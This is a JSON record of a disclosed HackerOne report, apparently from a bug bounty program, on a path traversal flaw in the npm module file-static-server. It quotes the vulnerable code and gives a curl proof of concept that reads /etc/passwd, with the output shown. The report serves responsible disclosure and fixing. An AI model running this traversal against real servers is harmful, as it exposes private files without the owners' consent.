{
  "id": 310671,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTA2NzE=",
  "url": "https://hackerone.com/reports/310671",
  "title": "[file-static-server] Path Traversal allows to read content of arbitrary file on the server",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2018-01-30T23:37:05.758Z",
  "submitted_at": "2018-01-30T23:37:05.758Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bl4de",
    "url": "/bl4de",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/017/622/285a07d9de896d5840ce1b556236272b751658e3_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2018-06-14T19:48:57.683Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2018-05-15T19:48:56.538Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi Guys,\n\nThere is Path Traversal vulnerability in file-static-server module, which allows to read arbitrary file from the remote server.\n\n## Module\n\n**file-static-server**\n\n[no description provided]\n\nhttps://www.npmjs.com/package/file-static-server\n\nversion: 1.0.2\n\nStats\n0 downloads in the last day\n3 downloads in the last week\n20 downloads in the last month\n\n~250 estimated downloads per year\n\n\n## Description\n\nVulnerability exists, because function which creates path for file to read does not implement any validation of input data and takes path just as is:\n\n```javascript\n// ./node_modules/file-static-server/lib/file.js, line 21:\ngetFilePath: function () {\n    if (this.filePath) {\n      return this.filePath\n    }\n    var url = this.req.url\n    var len = process.argv.length\n    this.filePath = path.join(process.argv[len - 1], url)\n    return this.filePath\n  },\n```\n\n```this.filePath``` is the used directly in function, which reads file:\n\n```javascript\n// ./node_modules/file-static-server/lib/file.js, line 87:\ngetStream: function () {\n    return fs.createReadStream(this.filePath)\n  }\n```\n\n## Steps To Reproduce:\n\n- install ```file-static-server``` module\n\n```\n$ npm install file-static-server\n```\n\n- run server from command line:\n\n```\n$ ./node_modules/file-static-server/bin/file-static-server -P 8080 ./\nserver start at 8080\n```\n\n- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):\n\n```\n$ curl -v --path-as-is http://127.0.0.1:8080/../../../../etc/passwd\n```\n\nResult:\n\n```\n*   Trying 192.168.1.1...\n* TCP_NODELAY set\n* Connected to 192.168.1.1 (192.168.1.1) port 8080 (#0)\n> GET /../../../../etc/passwd HTTP/1.1\n> Host: 192.168.1.1:8080\n> User-Agent: curl/7.54.0\n> Accept: */*\n>\n< HTTP/1.1 200 OK\n< server: static-1.0.2\n< content-type: application/octet-stream; charset=utf-8\n< content-length: 6774\n< etag: 898b8e56263723beb06955d4a7c2944d1eff7a21\n< cache-control: public; max-age=3153600000000\n< Date: Tue, 30 Jan 2018 23:27:23 GMT\n< Connection: keep-alive\n<\n##\n# User Database\n#\n# Note that this file is consulted directly only when the system is running\n# in single-user mode.  At other times this information is provided by\n# Open Directory.\n#\n# See the opendirectoryd(8) man page for additional information about\n# Open Directory.\n##\nnobody:*:-2:-2:Unprivileged User:/var/empty:/usr/bin/false\nroot:*:0:0:System Administrator:/var/root:/bin/sh\ndaemon:*:1:1:System Services:/var/root:/usr/bin/false\n_uucp:*:4:4:Unix to Unix Copy Protocol:/var/spool/uucp:/usr/sbin/uucico\n_taskgated:*:13:13:Task Gate Daemon:/var/empty:/usr/bin/false\n(...)\n```\n\n## Supporting Material/References:\n\nConfiguration:\n\n- macOS 10.13.3\n- Chromium 66.0.3331.0 (Developer Build) (64-bit) \n- Node.js version: v8.9.3\n- npm version: 5.5.1\n- curl 7.54.0\n\n\nPlease feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.\n\nI hope my report will help to keep Node.js ecosystem and its users safe in the future.\n\nRegards,\n\nRafal 'bl4de' Janicki\n\n## Impact\n\nThis vulnerability allows to read content of any file on the server",
  "weakness": {
    "id": 19,
    "name": "Path Traversal"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2018-06-14T19:48:56.659Z",
  "allow_singular_disclosure_after": -178823342.09153304,
  "singular_disclosure_allowed": true,
  "vote_count": 3,
  "voters": [
    "apapedulimu",
    "eveeez",
    "0x08"
  ],
  "severity": {
    "rating": "low",
    "score": 3.5,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "low",
      "privileges_required": "low",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "low",
      "integrity": "none",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
